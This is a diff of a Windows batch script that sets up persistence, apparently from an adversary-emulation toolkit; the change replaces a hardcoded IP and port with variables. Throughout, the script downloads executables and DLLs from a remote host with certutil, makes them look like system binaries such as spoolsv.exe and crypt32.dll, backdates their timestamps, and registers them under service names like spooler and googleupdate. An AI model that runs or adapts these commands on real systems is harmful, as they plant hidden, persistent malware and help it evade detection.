@@ -1,5 +1,8 @@
 rem @echo off
 
+SET PORT=9983
+SET IP=10.5.9.9
+
 2>NUL CALL :CASE_%1
 IF ERRORLEVEL 1 CALL :DEFAULT
 EXIT /B
@@ -9,10 +12,10 @@ REM UDP Psersistence AppInit keys
 REM 64-bit
 mkdir c:\temp
 cd \temp
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/touch.exe" touch.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll64.dll" updll64.dll
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll32.dll" updll32.dll
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/touch.exe" touch.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll64.dll" updll64.dll
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll32.dll" updll32.dll
 ditto.exe c:\windows\system32\sxs.dll updll64.dll
 ditto.exe c:\windows\system32\sxs.dll updll32.dll
 touch -t 201308220431 -- c:\temp\updll64.dll
@@ -35,8 +38,8 @@ SET SERVICENAME=googleupdate
 REM bitsadmin persistance
 mkdir c:\temp
 cd \temp
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/up.exe" up.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/up.exe" up.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
 ditto.exe c:\windows\system32\dllhost.exe up.exe
 touch -t 201308220431 -- c:\temp\up.exe
 del touch.exe
@@ -55,8 +58,8 @@ REM service persistence
 SET SERVICENAME=spooler
 mkdir c:\temp
 cd \temp
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/up.exe" up.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/up.exe" up.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
 ditto.exe c:\windows\system32\spoolsv.exe up.exe
 touch -t 201308220431 -- c:\temp\up.exe
 del ditto.exe
@@ -71,9 +74,9 @@ GOTO DEFAULT
 sc stop Browser
 mkdir c:\temp
 cd \temp
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/touch.exe" touch.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/ditto.exe" ditto.exe
-certutil.exe -urlcache -split -f "http://10.5.9.9:9983/updll64.dll" updll64.dll
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/touch.exe" touch.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
+certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll64.dll" updll64.dll
 ditto.exe c:\windows\system32\crypt32.dll updll64.dll
 touch -t 201308220431 -- c:\temp\updll64.dll
 del touch.exe
